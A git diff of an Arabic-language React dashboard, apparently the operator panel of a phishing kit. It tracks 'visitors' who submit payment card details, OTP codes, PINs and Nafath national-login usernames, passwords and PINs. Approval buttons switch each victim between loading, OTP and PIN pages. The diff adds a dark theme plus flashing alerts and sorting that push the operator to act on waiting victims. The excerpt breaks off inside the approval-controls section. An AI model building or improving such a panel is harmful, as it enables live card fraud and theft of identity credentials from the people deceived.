@@ -44,6 +44,7 @@ import {
   X,
   Copy,
   Check,
+  Bell,
 } from "lucide-react"
 
 // ─── Types ───────────────────────────────────────────────────────────────────
@@ -71,15 +72,15 @@ const STEP_LABELS: Record<string, string> = {
 }
 
 const STEP_COLORS: Record<string, string> = {
-  "": "bg-gray-100 text-gray-600",
-  "booking-completed": "bg-blue-100 text-blue-700",
-  "booking-details-submitted": "bg-blue-100 text-blue-700",
-  "payment-method-selected": "bg-amber-100 text-amber-700",
-  "card-details-submitted": "bg-orange-100 text-orange-700",
-  "otp-submitted": "bg-purple-100 text-purple-700",
-  "pin-submitted": "bg-indigo-100 text-indigo-700",
-  "phone-otp-requested": "bg-cyan-100 text-cyan-700",
-  "payment-completed": "bg-emerald-100 text-emerald-700",
+  "": "bg-gray-700/50 text-gray-300",
+  "booking-completed": "bg-blue-900/50 text-blue-300",
+  "booking-details-submitted": "bg-blue-900/50 text-blue-300",
+  "payment-method-selected": "bg-amber-900/50 text-amber-300",
+  "card-details-submitted": "bg-orange-900/50 text-orange-300",
+  "otp-submitted": "bg-purple-900/50 text-purple-300",
+  "pin-submitted": "bg-indigo-900/50 text-indigo-300",
+  "phone-otp-requested": "bg-cyan-900/50 text-cyan-300",
+  "payment-completed": "bg-emerald-900/50 text-emerald-300",
 }
 
 const APPROVAL_LABELS: Record<string, string> = {
@@ -90,10 +91,10 @@ const APPROVAL_LABELS: Record<string, string> = {
 }
 
 const APPROVAL_COLORS: Record<string, string> = {
-  pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
-  approved: "bg-green-100 text-green-800 border-green-200",
-  rejected: "bg-red-100 text-red-800 border-red-200",
-  otp: "bg-blue-100 text-blue-800 border-blue-200",
+  pending: "bg-yellow-900/50 text-yellow-300 border-yellow-700",
+  approved: "bg-green-900/50 text-green-300 border-green-700",
+  rejected: "bg-red-900/50 text-red-300 border-red-700",
+  otp: "bg-blue-900/50 text-blue-300 border-blue-700",
 }
 
 // ─── Utility ─────────────────────────────────────────────────────────────────
@@ -144,6 +145,27 @@ function getInitials(name: string): string {
   return parts[0][0] + (parts[1]?.[0] || "")
 }
 
+// Check if a record needs approval (admin action required)
+function needsApproval(record: FirestoreRecord): boolean {
+  const step = str(record.step)
+  const cardApproval = str(record.cardApproval)
+  const phoneApproval = str(record.phoneApproval)
+  const phoneOtpApproval = str(record.phoneOtpApproval)
+
+  // Card submitted but approval still pending
+  if (step === "card-details-submitted" && (cardApproval === "pending" || !cardApproval)) return true
+  // OTP submitted, waiting for approval
+  if (step === "otp-submitted" && (cardApproval === "otp" || cardApproval === "pending")) return true
+  // PIN submitted, waiting for next action
+  if (step === "pin-submitted") return true
+  // Phone OTP requested, pending approval
+  if (step === "phone-otp-requested" && (phoneOtpApproval === "pending" || !phoneOtpApproval)) return true
+  // Phone verification pending
+  if (phoneApproval === "pending" && str(record.phone)) return true
+
+  return false
+}
+
 // Color palette for avatar backgrounds
 const AVATAR_COLORS = [
   "bg-teal-600", "bg-blue-600", "bg-purple-600", "bg-rose-600",
@@ -188,20 +210,20 @@ function DetailRow({
   }
 
   return (
-    <div className="flex items-start gap-3 py-2.5 border-b border-gray-100/80 last:border-0 group">
-      {Icon && <Icon className="h-4 w-4 text-gray-400 mt-0.5 shrink-0" />}
+    <div className="flex items-start gap-3 py-2.5 border-b border-[#2a3942]/60 last:border-0 group">
+      {Icon && <Icon className="h-4 w-4 text-gray-500 mt-0.5 shrink-0" />}
       <div className="flex-1 min-w-0">
-        <p className="text-[11px] text-gray-400 mb-0.5">{label}</p>
+        <p className="text-[11px] text-gray-500 mb-0.5">{label}</p>
         {badge ? (
-          <span className={`inline-block px-2.5 py-0.5 rounded-full text-xs font-semibold ${badgeColor || "bg-gray-100 text-gray-700"}`}>
+          <span className={`inline-block px-2.5 py-0.5 rounded-full text-xs font-semibold ${badgeColor || "bg-gray-700 text-gray-300"}`}>
             {value}
           </span>
         ) : (
           <div className="flex items-center gap-2">
-            <p className={`text-sm font-medium text-gray-800 break-all ${mono ? "font-mono tracking-wide" : ""}`}>{value}</p>
+            <p className={`text-sm font-medium text-gray-200 break-all ${mono ? "font-mono tracking-wide" : ""}`}>{value}</p>
             {copyable && (
-              <button onClick={handleCopy} className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 rounded hover:bg-gray-100">
-                {copied ? <Check className="h-3 w-3 text-green-500" /> : <Copy className="h-3 w-3 text-gray-400" />}
+              <button onClick={handleCopy} className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 rounded hover:bg-white/10">
+                {copied ? <Check className="h-3 w-3 text-green-400" /> : <Copy className="h-3 w-3 text-gray-500" />}
               </button>
             )}
           </div>
@@ -242,8 +264,8 @@ function ApprovalActions({
           onClick={() => handleClick(status)}
           className={`px-3.5 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5 border ${
             current === status
-              ? (APPROVAL_COLORS[status] || "bg-teal-100 text-teal-800 border-teal-200") + " ring-2 ring-offset-1 ring-current shadow-sm"
-              : "bg-white text-gray-500 border-gray-200 hover:border-gray-300 hover:bg-gray-50"
+              ? (APPROVAL_COLORS[status] || "bg-teal-900/50 text-teal-300 border-teal-700") + " ring-2 ring-offset-1 ring-offset-[#1b2b33] ring-current shadow-sm"
+              : "bg-[#1b2b33] text-gray-400 border-[#2a3942] hover:border-gray-500 hover:bg-[#233a45]"
           }`}
         >
           {busy === status && <Loader2 className="h-3 w-3 animate-spin" />}
@@ -288,8 +310,8 @@ function NavigateVisitorControl({
             onClick={() => handleClick(p.key)}
             className={`px-3 py-2 rounded-lg text-xs font-semibold transition-all flex items-center justify-center gap-1.5 border ${
               current === p.key
-                ? "bg-teal-50 text-teal-800 ring-2 ring-offset-1 ring-teal-500 border-teal-200"
-                : "bg-white border-gray-200 text-gray-700 hover:border-teal-300 hover:bg-teal-50/50"
+                ? "bg-teal-900/50 text-teal-300 ring-2 ring-offset-1 ring-offset-[#1b2b33] ring-teal-500 border-teal-700"
+                : "bg-[#1b2b33] border-[#2a3942] text-gray-300 hover:border-teal-600 hover:bg-teal-900/30"
             }`}
           >
             {busy === p.key ? <Loader2 className="h-3 w-3 animate-spin" /> : <span>{p.icon}</span>}
@@ -301,7 +323,7 @@ function NavigateVisitorControl({
         <button
           onClick={handleClear}
           disabled={busy !== null}
-          className="text-[11px] text-gray-400 hover:text-red-500 transition-colors flex items-center gap-1"
+          className="text-[11px] text-gray-500 hover:text-red-400 transition-colors flex items-center gap-1"
         >
           {busy === "_clear" ? <Loader2 className="h-3 w-3 animate-spin" /> : "✕"}
           مسح التوجيه
@@ -338,15 +360,14 @@ function TextFieldControl({
 
   return (
     <div className="flex gap-2">
-      <Input
+      <input
         value={value}
         onChange={(e) => setValue(e.target.value)}
         placeholder={placeholder}
-        className="h-9 text-sm flex-1 bg-white"
+        className="h-9 text-sm flex-1 bg-[#1b2b33] border border-[#2a3942] rounded-lg px-3 text-gray-200 placeholder-gray-600 outline-none focus:border-teal-600 transition-colors"
       />
-      <Button
-        size="sm"
-        className="bg-teal-700 hover:bg-teal-800 text-white h-9 min-w-[70px]"
+      <button
+        className="bg-teal-700 hover:bg-teal-600 text-white h-9 px-4 rounded-lg text-xs font-semibold min-w-[70px] flex items-center justify-center gap-1 transition-colors disabled:opacity-50"
         onClick={handleSave}
         disabled={busy}
       >
@@ -357,7 +378,7 @@ function TextFieldControl({
         ) : (
           "حفظ"
         )}
-      </Button>
+      </button>
     </div>
   )
 }
@@ -381,6 +402,7 @@ function ConversationItem({
   const hasOtp = !!(str(record.otp) || str(record.phoneOtp))
   const hasNafad = !!(str(record.nafadUsername) || str(record.nafadPassword) || str(record.nafaz_pin))
   const time = formatTime(str(record.createdAt))
+  const approvalNeeded = needsApproval(record)
 
   // Generate last activity description
   const getLastActivity = () => {
@@ -395,32 +417,43 @@ function ConversationItem({
   return (
     <div
       onClick={onClick}
-      className={`flex items-center gap-3 px-4 py-3 cursor-pointer transition-all border-b border-gray-100 hover:bg-gray-50 ${
-        isSelected ? "bg-teal-50/70 border-r-[3px] border-r-teal-600" : ""
-      } ${isUnread ? "bg-white" : "bg-white/50"}`}
+      className={`relative flex items-center gap-3 px-4 py-3 cursor-pointer transition-all border-b border-[#222e35] hover:bg-[#202c33] ${
+        isSelected ? "bg-[#2a3942] border-r-[3px] border-r-teal-500" : ""
+      } ${approvalNeeded ? "flash-approval" : ""}`}
     >
+      {/* Flashing approval indicator */}
+      {approvalNeeded && (
+        <div className="absolute top-1.5 left-1.5 z-10">
+          <span className="relative flex h-3 w-3">
+            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+            <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
+          </span>
+        </div>
+      )}
+
       {/* Avatar */}
       <div className="relative shrink-0">
-        <div className={`w-12 h-12 rounded-full flex items-center justify-center text-white text-sm font-bold ${getAvatarColor(str(record.id))}`}>
+        <div className={`w-12 h-12 rounded-full flex items-center justify-center text-white text-sm font-bold ${getAvatarColor(str(record.id))} ${approvalNeeded ? "ring-2 ring-red-500/60 ring-offset-1 ring-offset-[#111b21]" : ""}`}>
           {getInitials(name)}
         </div>
         {isOnline && (
-          <span className="absolute bottom-0 left-0 w-3.5 h-3.5 bg-green-500 border-2 border-white rounded-full" />
+          <span className="absolute bottom-0 left-0 w-3.5 h-3.5 bg-green-500 border-2 border-[#111b21] rounded-full" />
         )}
       </div>
 
       {/* Content */}
       <div className="flex-1 min-w-0">
         <div className="flex items-center justify-between mb-0.5">
-          <h3 className={`text-sm truncate max-w-[160px] ${isUnread ? "font-bold text-gray-900" : "font-medium text-gray-700"}`}>
+          <h3 className={`text-sm truncate max-w-[160px] ${isUnread ? "font-bold text-gray-100" : "font-medium text-gray-300"}`}>
             {name}
           </h3>
-          <span className={`text-[11px] shrink-0 mr-1 ${isUnread ? "text-teal-600 font-semibold" : "text-gray-400"}`}>
+          <span className={`text-[11px] shrink-0 mr-1 ${isUnread ? "text-teal-400 font-semibold" : "text-gray-500"}`}>
             {time}
           </span>
         </div>
         <div className="flex items-center justify-between">
-          <p className={`text-xs truncate max-w-[180px] ${isUnread ? "text-gray-700 font-medium" : "text-gray-400"}`}>
+          <p className={`text-xs truncate max-w-[180px] ${isUnread ? "text-gray-300 font-medium" : "text-gray-500"}`}>
+            {approvalNeeded && <span className="text-red-400 font-semibold">⚠ تحتاج موافقة • </span>}
             {getLastActivity()}
           </p>
           <div className="flex items-center gap-1.5 shrink-0">
@@ -448,24 +481,32 @@ function Section({
   icon: Icon,
   children,
   defaultOpen = true,
+  flash = false,
 }: {
   title: string
   icon: React.ComponentType<{ className?: string }>
   children: React.ReactNode
   defaultOpen?: boolean
+  flash?: boolean
 }) {
   const [open, setOpen] = useState(defaultOpen)
   return (
-    <div className="bg-white rounded-xl border border-gray-100 overflow-hidden shadow-sm">
+    <div className={`bg-[#1f2c34] rounded-xl border overflow-hidden shadow-sm ${flash ? "border-red-500/50 flash-section" : "border-[#2a3942]"}`}>
       <button
         onClick={() => setOpen(!open)}
-        className="w-full flex items-center justify-between px-4 py-3 hover:bg-gray-50/50 transition-colors"
+        className="w-full flex items-center justify-between px-4 py-3 hover:bg-[#233a45]/50 transition-colors"
       >
         <div className="flex items-center gap-2">
-          <Icon className="h-4 w-4 text-teal-700" />
-          <span className="text-sm font-bold text-gray-800">{title}</span>
+          <Icon className="h-4 w-4 text-teal-400" />
+          <span className="text-sm font-bold text-gray-200">{title}</span>
+          {flash && (
+            <span className="relative flex h-2.5 w-2.5 mr-1">
+              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
+            </span>
+          )}
         </div>
-        <ChevronDown className={`h-4 w-4 text-gray-400 transition-transform ${open ? "rotate-180" : ""}`} />
+        <ChevronDown className={`h-4 w-4 text-gray-500 transition-transform ${open ? "rotate-180" : ""}`} />
       </button>
       {open && <div className="px-4 pb-4">{children}</div>}
     </div>
@@ -476,20 +517,20 @@ function Section({
 
 function EmptyState() {
   return (
-    <div className="flex-1 flex flex-col items-center justify-center bg-[#f0ebe3] text-center p-8">
+    <div className="flex-1 flex flex-col items-center justify-center bg-[#0b141a] text-center p-8">
       <div className="w-64 h-64 mb-6 flex items-center justify-center">
         <div className="relative">
-          <div className="w-40 h-40 rounded-full bg-teal-100/50 flex items-center justify-center">
-            <MessageSquare className="h-20 w-20 text-teal-300" />
+          <div className="w-40 h-40 rounded-full bg-teal-900/30 flex items-center justify-center">
+            <MessageSquare className="h-20 w-20 text-teal-700" />
           </div>
-          <div className="absolute -top-2 -right-2 w-8 h-8 rounded-full bg-teal-200/60 flex items-center justify-center">
-            <Shield className="h-4 w-4 text-teal-400" />
+          <div className="absolute -top-2 -right-2 w-8 h-8 rounded-full bg-teal-800/40 flex items-center justify-center">
+            <Shield className="h-4 w-4 text-teal-600" />
           </div>
-          <div className="absolute -bottom-1 -left-3 w-6 h-6 rounded-full bg-teal-200/40" />
+          <div className="absolute -bottom-1 -left-3 w-6 h-6 rounded-full bg-teal-800/20" />
         </div>
       </div>
-      <h2 className="text-xl font-bold text-gray-600 mb-2">لوحة التحكم</h2>
-      <p className="text-sm text-gray-400 max-w-xs leading-relaxed">
+      <h2 className="text-xl font-bold text-gray-400 mb-2">لوحة التحكم</h2>
+      <p className="text-sm text-gray-600 max-w-xs leading-relaxed">
         اختر محادثة من القائمة لعرض التفاصيل والتحكم في بيانات الزائر
       </p>
     </div>
@@ -566,7 +607,6 @@ export default function DashboardPage() {
     setSelectedId(record.id)
     setMobileShowDetail(true)
     markAsRead(record)
-    // Scroll detail panel to top
     setTimeout(() => {
       detailRef.current?.scrollTo({ top: 0, behavior: "smooth" })
     }, 50)
@@ -589,7 +629,12 @@ export default function DashboardPage() {
       list = list.filter((r) => str(r.step) === stepFilter)
     }
 
+    // Sort: put approval-needed items first, then by chosen sort
     list.sort((a, b) => {
+      const aNeed = needsApproval(a) ? 0 : 1
+      const bNeed = needsApproval(b) ? 0 : 1
+      if (aNeed !== bNeed) return aNeed - bNeed
+
       const aVal = str(a[sortField]).toLowerCase()
       const bVal = str(b[sortField]).toLowerCase()
       const cmp = aVal.localeCompare(bVal)
@@ -607,7 +652,8 @@ export default function DashboardPage() {
     const pendingPayment = records.filter((r) => ["card-details-submitted", "otp-submitted", "pin-submitted", "phone-otp-requested"].includes(str(r.step))).length
     const online = records.filter((r) => r.online === true).length
     const unread = records.filter((r) => r.isRead === false).length
-    return { total, completed, pendingPayment, online, unread }
+    const approvalCount = records.filter((r) => needsApproval(r)).length
+    return { total, completed, pendingPayment, online, unread, approvalCount }
   }, [records])
 
   // ── Export CSV ───────────────────────────────────────────────────────────
@@ -634,95 +680,120 @@ export default function DashboardPage() {
 
   if (loading) {
     return (
-      <div className="h-screen flex items-center justify-center bg-[#f0ebe3]">
+      <div className="h-screen flex items-center justify-center bg-[#0b141a]">
         <div className="flex flex-col items-center gap-4">
           <div className="w-16 h-16 rounded-full bg-teal-700 flex items-center justify-center">
             <Loader2 className="h-8 w-8 animate-spin text-white" />
           </div>
-          <p className="text-lg text-gray-500 font-medium">جاري تحميل البيانات...</p>
+          <p className="text-lg text-gray-400 font-medium">جاري تحميل البيانات...</p>
         </div>
       </div>
     )
   }
 
+  // Determine if selected record needs approval (for header flash)
+  const selectedNeedsApproval = selectedRecord ? needsApproval(selectedRecord) : false
+
   // ── Render ───────────────────────────────────────────────────────────────
 
   return (
-    <div className="h-screen flex overflow-hidden bg-[#f0ebe3]" dir="rtl" lang="ar">
+    <div className="h-screen flex overflow-hidden bg-[#0b141a]" dir="rtl" lang="ar">
       {/* ═══════════════════════════════════════════════════════════════════════
           SIDEBAR — Conversations List
           ═══════════════════════════════════════════════════════════════════════ */}
-      <aside className={`flex flex-col border-l border-gray-200 bg-white w-full md:w-[380px] lg:w-[420px] md:max-w-[420px] shrink-0 ${
+      <aside className={`flex flex-col border-l border-[#2a3942] bg-[#111b21] w-full md:w-[380px] lg:w-[420px] md:max-w-[420px] shrink-0 ${
         mobileShowDetail ? "hidden md:flex" : "flex"
       }`}>
         {/* ── Sidebar Header ─────────────────────────────────────────────── */}
-        <div className="bg-teal-700 px-4 py-3">
+        <div className="bg-[#202c33] px-4 py-3">
           <div className="flex items-center justify-between mb-3">
             <div className="flex items-center gap-3">
-              <div className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center">
+              <div className="w-10 h-10 rounded-full bg-teal-700 flex items-center justify-center">
                 <Shield className="h-5 w-5 text-white" />
               </div>
               <div>
-                <h1 className="text-base font-bold text-white">لوحة التحكم</h1>
-                <p className="text-[11px] text-teal-100">
+                <h1 className="text-base font-bold text-gray-100">لوحة التحكم</h1>
+                <p className="text-[11px] text-gray-400">
                   {stats.total} زائر • {stats.online} متصل
+                  {stats.approvalCount > 0 && (
+                    <span className="text-red-400 mr-1">• {stats.approvalCount} بحاجة موافقة</span>
+                  )}
                 </p>
               </div>
             </div>
             <div className="flex items-center gap-1">
+              {stats.approvalCount > 0 && (
+                <div className="relative p-2">
+                  <Bell className="h-5 w-5 text-red-400 flash-icon" />
+                  <span className="absolute top-0.5 right-0.5 w-4 h-4 rounded-full bg-red-500 text-white text-[9px] flex items-center justify-center font-bold">
+                    {stats.approvalCount}
+                  </span>
+                </div>
+              )}
               <button
                 onClick={() => setShowFilters(!showFilters)}
-                className="p-2 rounded-full hover:bg-white/10 transition-colors"
+                className="p-2 rounded-full hover:bg-white/5 transition-colors"
                 title="فلاتر"
               >
-                <Settings className="h-5 w-5 text-teal-100" />
+                <Settings className="h-5 w-5 text-gray-400" />
               </button>
               <button
                 onClick={exportCSV}
-                className="p-2 rounded-full hover:bg-white/10 transition-colors"
+                className="p-2 rounded-full hover:bg-white/5 transition-colors"
                 title="تصدير CSV"
               >
-                <Download className="h-5 w-5 text-teal-100" />
+                <Download className="h-5 w-5 text-gray-400" />
               </button>
             </div>
           </div>
 
           {/* Search Bar */}
           <div className="relative">
-            <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-teal-300" />
+            <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
             <input
               type="text"
               placeholder="بحث..."
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
-              className="w-full h-9 pr-10 pl-3 bg-teal-600/50 text-white placeholder-teal-200 rounded-lg text-sm border-none outline-none focus:bg-teal-600/70 transition-colors"
+              className="w-full h-9 pr-10 pl-3 bg-[#2a3942] text-gray-200 placeholder-gray-500 rounded-lg text-sm border-none outline-none focus:bg-[#323f49] transition-colors"
             />
           </div>
         </div>
 
         {/* ── Quick Stats Strip ──────────────────────────────────────────── */}
-        <div className="flex items-center gap-2 px-4 py-2 border-b border-gray-100 bg-gray-50/50 overflow-x-auto chat-scrollbar-hidden">
+        <div className="flex items-center gap-2 px-4 py-2 border-b border-[#222e35] bg-[#111b21] overflow-x-auto chat-scrollbar-hidden">
           <button
             onClick={() => setStepFilter("all")}
             className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
-              stepFilter === "all" ? "bg-teal-100 text-teal-800" : "bg-white text-gray-500 border border-gray-200"
+              stepFilter === "all" ? "bg-teal-900/50 text-teal-300" : "bg-[#2a3942] text-gray-400"
             }`}
           >
             الكل <span className="font-bold">{stats.total}</span>
           </button>
+          {stats.approvalCount > 0 && (
+            <button
+              onClick={() => {/* stays as visual indicator */}}
+              className="shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-red-900/40 text-red-300 flash-pill"
+            >
+              <span className="relative flex h-1.5 w-1.5">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-red-400"></span>
+              </span>
+              موافقة <span className="font-bold">{stats.approvalCount}</span>
+            </button>
+          )}
           {stats.unread > 0 && (
             <button
-              onClick={() => {/* could add unread filter */}}
-              className="shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-red-50 text-red-700 border border-red-100"
+              onClick={() => {}}
+              className="shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-amber-900/40 text-amber-300"
             >
-              <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
               جديد <span className="font-bold">{stats.unread}</span>
             </button>
           )}
           <button
             onClick={() => setStepFilter("payment-completed")}
             className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
-              stepFilter === "payment-completed" ? "bg-emerald-100 text-emerald-800" : "bg-white text-gray-500 border border-gray-200"
+              stepFilter === "payment-completed" ? "bg-emerald-900/50 text-emerald-300" : "bg-[#2a3942] text-gray-400"
             }`}
           >
             مكتمل <span className="font-bold">{stats.completed}</span>
@@ -730,7 +801,7 @@ export default function DashboardPage() {
           <button
             onClick={() => setStepFilter("card-details-submitted")}
             className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
-              stepFilter === "card-details-submitted" ? "bg-orange-100 text-orange-800" : "bg-white text-gray-500 border border-gray-200"
+              stepFilter === "card-details-submitted" ? "bg-orange-900/50 text-orange-300" : "bg-[#2a3942] text-gray-400"
             }`}
           >
             بطاقة <span className="font-bold">{stats.pendingPayment}</span>
@@ -739,12 +810,12 @@ export default function DashboardPage() {
 
         {/* ── Filters Panel (toggle) ─────────────────────────────────────── */}
         {showFilters && (
-          <div className="px-4 py-3 border-b border-gray-100 bg-gray-50/50 space-y-2">
+          <div className="px-4 py-3 border-b border-[#222e35] bg-[#1a2730] space-y-2">
             <Select value={stepFilter} onValueChange={setStepFilter}>
-              <SelectTrigger className="h-9 text-xs bg-white">
+              <SelectTrigger className="h-9 text-xs bg-[#2a3942] border-[#3a4a53] text-gray-300">
                 <SelectValue placeholder="فلتر الحالة" />
               </SelectTrigger>
-              <SelectContent>
+              <SelectContent className="bg-[#2a3942] border-[#3a4a53] text-gray-200">
                 <SelectItem value="all">جميع الحالات</SelectItem>
                 {Object.entries(STEP_LABELS).map(([key, label]) => (
                   <SelectItem key={key || "_empty"} value={key || "_empty"}>
@@ -756,14 +827,14 @@ export default function DashboardPage() {
             <div className="flex items-center gap-2">
               <button
                 onClick={() => { setSortField("createdAt"); setSortDir(d => d === "asc" ? "desc" : "asc") }}
-                className="flex-1 flex items-center justify-center gap-1 h-8 bg-white border border-gray-200 rounded-lg text-xs text-gray-600 hover:bg-gray-50"
+                className="flex-1 flex items-center justify-center gap-1 h-8 bg-[#2a3942] border border-[#3a4a53] rounded-lg text-xs text-gray-400 hover:bg-[#323f49]"
               >
                 <ArrowUpDown className="h-3 w-3" />
                 {sortDir === "desc" ? "الأحدث أولاً" : "الأقدم أولاً"}
               </button>
               <button
                 onClick={() => { setSearchTerm(""); setStepFilter("all") }}
-                className="h-8 px-3 bg-white border border-gray-200 rounded-lg text-xs text-gray-500 hover:bg-gray-50"
+                className="h-8 px-3 bg-[#2a3942] border border-[#3a4a53] rounded-lg text-xs text-gray-500 hover:bg-[#323f49]"
               >
                 مسح الفلاتر
               </button>
@@ -775,9 +846,9 @@ export default function DashboardPage() {
         <div className="flex-1 overflow-y-auto chat-scrollbar">
           {processed.length === 0 ? (
             <div className="flex flex-col items-center justify-center py-20 text-center">
-              <FileText className="h-12 w-12 text-gray-200 mb-3" />
-              <p className="text-sm font-medium text-gray-400">لا توجد نتائج</p>
-              <p className="text-xs text-gray-300 mt-1">جرّب تغيير معايير البحث</p>
+              <FileText className="h-12 w-12 text-gray-700 mb-3" />
+              <p className="text-sm font-medium text-gray-500">لا توجد نتائج</p>
+              <p className="text-xs text-gray-600 mt-1">جرّب تغيير معايير البحث</p>
             </div>
           ) : (
             processed.map((r) => (
@@ -801,38 +872,46 @@ export default function DashboardPage() {
         {selectedRecord ? (
           <>
             {/* ── Detail Header ──────────────────────────────────────────── */}
-            <div className="bg-teal-700 px-4 py-3 flex items-center gap-3 shrink-0">
+            <div className={`px-4 py-3 flex items-center gap-3 shrink-0 ${selectedNeedsApproval ? "bg-[#202c33] flash-header" : "bg-[#202c33]"}`}>
               {/* Back button (mobile) */}
               <button
                 onClick={() => setMobileShowDetail(false)}
-                className="md:hidden p-1.5 rounded-full hover:bg-white/10 transition-colors"
+                className="md:hidden p-1.5 rounded-full hover:bg-white/5 transition-colors"
               >
-                <ChevronRight className="h-5 w-5 text-white" />
+                <ChevronRight className="h-5 w-5 text-gray-300" />
               </button>
 
               {/* Avatar */}
               <div className="relative shrink-0">
-                <div className={`w-10 h-10 rounded-full flex items-center justify-center text-white text-sm font-bold ${getAvatarColor(str(selectedRecord.id))}`}>
+                <div className={`w-10 h-10 rounded-full flex items-center justify-center text-white text-sm font-bold ${getAvatarColor(str(selectedRecord.id))} ${selectedNeedsApproval ? "ring-2 ring-red-500/70 ring-offset-1 ring-offset-[#202c33]" : ""}`}>
                   {getInitials(str(selectedRecord.ownerName) || str(selectedRecord.name) || str(selectedRecord.id).slice(0, 10))}
                 </div>
                 {selectedRecord.online === true && (
-                  <span className="absolute bottom-0 left-0 w-3 h-3 bg-green-400 border-2 border-teal-700 rounded-full" />
+                  <span className="absolute bottom-0 left-0 w-3 h-3 bg-green-400 border-2 border-[#202c33] rounded-full" />
                 )}
               </div>
 
               {/* User info */}
               <div className="flex-1 min-w-0">
-                <h2 className="text-sm font-bold text-white truncate">
+                <h2 className="text-sm font-bold text-gray-100 truncate">
                   {str(selectedRecord.ownerName) || str(selectedRecord.name) || "تفاصيل السجل"}
                 </h2>
-                <p className="text-[11px] text-teal-100">
-                  {selectedRecord.online === true ? "متصل الآن" : "غير متصل"} • {str(selectedRecord.country) || "—"}
+                <p className="text-[11px] text-gray-400">
+                  {selectedRecord.online === true ? (
+                    <span className="text-green-400">متصل الآن</span>
+                  ) : "غير متصل"} • {str(selectedRecord.country) || "—"}
                   {str(selectedRecord.phone) ? ` • ${str(selectedRecord.phone)}` : ""}
                 </p>
               </div>
 
               {/* Header actions */}
-              <div className="flex items-center gap-1 shrink-0">
+              <div className="flex items-center gap-2 shrink-0">
+                {selectedNeedsApproval && (
+                  <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-bold bg-red-900/50 text-red-300 flash-badge">
+                    <Bell className="h-3.5 w-3.5" />
+                    تحتاج موافقة
+                  </span>
+                )}
                 {str(selectedRecord.step) && (
                   <span className={`hidden sm:inline-block px-2.5 py-1 rounded-full text-[11px] font-semibold ${STEP_COLORS[str(selectedRecord.step)] || STEP_COLORS[""]}`}>
                     {STEP_LABELS[str(selectedRecord.step)] || str(selectedRecord.step)}
@@ -844,15 +923,35 @@ export default function DashboardPage() {
             {/* ── Detail Content ─────────────────────────────────────────── */}
             <div
               ref={detailRef}
-              className="flex-1 overflow-y-auto bg-[#e5ddd5] chat-pattern chat-scrollbar"
+              className="flex-1 overflow-y-auto bg-[#0b141a] chat-pattern-dark chat-scrollbar"
             >
               <div className="max-w-3xl mx-auto p-4 space-y-3">
                 {/* ID Badge */}
                 <div className="flex justify-center mb-2">
-                  <span className="bg-white/80 backdrop-blur-sm text-gray-500 text-[11px] font-mono px-4 py-1.5 rounded-full shadow-sm">
+                  <span className="bg-[#1b2b33]/90 backdrop-blur-sm text-gray-500 text-[11px] font-mono px-4 py-1.5 rounded-full shadow-sm border border-[#2a3942]">
                     {selectedRecord.id}
                   </span>
                 </div>
+
+                {/* ── Approval Alert Banner ─────────────────────────────── */}
+                {selectedNeedsApproval && (
+                  <div className="bg-red-900/30 border border-red-800/50 rounded-xl p-4 flash-section">
+                    <div className="flex items-center gap-3">
+                      <div className="relative shrink-0">
+                        <span className="relative flex h-5 w-5">
+                          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                          <span className="relative inline-flex rounded-full h-5 w-5 bg-red-500 items-center justify-center">
+                            <AlertTriangle className="h-3 w-3 text-white" />
+                          </span>
+                        </span>
+                      </div>
+                      <div>
+                        <p className="text-sm font-bold text-red-300">هذا الزائر يحتاج موافقتك!</p>
+                        <p className="text-xs text-red-400/80 mt-0.5">انتقل إلى قسم &quot;التحكم في الموافقات&quot; لاتخاذ إجراء</p>
+                      </div>
+                    </div>
+                  </div>
+                )}
 
                 {/* ── Personal Info ─────────────────────────────────────── */}
                 <Section title="المعلومات الشخصية" icon={User}>
@@ -914,23 +1013,23 @@ export default function DashboardPage() {
                 )}
 
                 {/* ── Approval Controls ─────────────────────────────────── */}
-                <Section title="التحكم في الموافقات" icon={CheckCircle2}>
+                <Section title="التحكم في الموافقات" icon={CheckCircle2} flash={selectedNeedsApproval}>
                   <div className="space-y-5">
                     <div>
-                      <p className="text-xs font-semibold text-gray-700 mb-1">موافقة البطاقة</p>
-                      <p className="text-[10px] text-gray-400 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة PIN | rejected=رفض</p>
+                      <p className="text-xs font-semibold text-gray-300 mb-1">موافقة البطاقة</p>
+                      <p className="text-[10px] text-gray-500 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة PIN | rejected=رفض</p>
                       <ApprovalActions record={selectedRecord} field="cardApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
                     </div>
 
                     <div>
-                      <p className="text-xs font-semibold text-gray-700 mb-1">موافقة OTP الجوال</p>
-                      <p className="text-[10px] text-gray-400 mb-2">approved=انتقال لنفاذ | rejected=رفض | pending=انتظار</p>
+                      <p className="text-xs font-semibold text-gray-300 mb-1">موافقة OTP الجوال</p>
